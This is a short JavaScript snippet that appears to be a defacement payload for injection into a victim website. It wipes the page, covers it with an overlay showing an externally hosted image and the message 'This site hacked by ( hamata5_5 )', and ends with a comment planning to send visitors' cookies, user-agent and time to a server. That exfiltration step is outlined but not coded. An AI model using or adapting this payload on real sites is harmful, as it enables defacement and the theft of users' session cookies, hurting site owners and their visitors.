  // SOME STYLING FOR FUN
  document.body.innerHTML = "";
  
  const center = document.createElement("center");
  center.style.cssText = `width: 100vw; height: 100vh; background:#000c03 ;padding:100px 0px; position: fixed; z-index: 99999;top:0px;left:0px;`;
  
  const img = document.createElement("img");
  img.src = "https://i.ibb.co/fHwRR5y/kalawy.jpg";
  img.style.width = "300px";
  center.appendChild(img);
  
  const h1 = document.createElement("h1");
  h1.textContent = "This site hacked by ";
  h1.style.color = "white";
  
  const i = document.createElement("i");
  i.textContent = "( hamata5_5 )";
  i.style.fontSize = "3rem";
  i.style.color = "green";
  
  h1.appendChild(i);
  center.appendChild(h1);
  
  document.body.appendChild(center);

// LET'S START
/*
    1- Connect to the server
    2- Send request that contains the cookies/user-agent/time...etc
*/
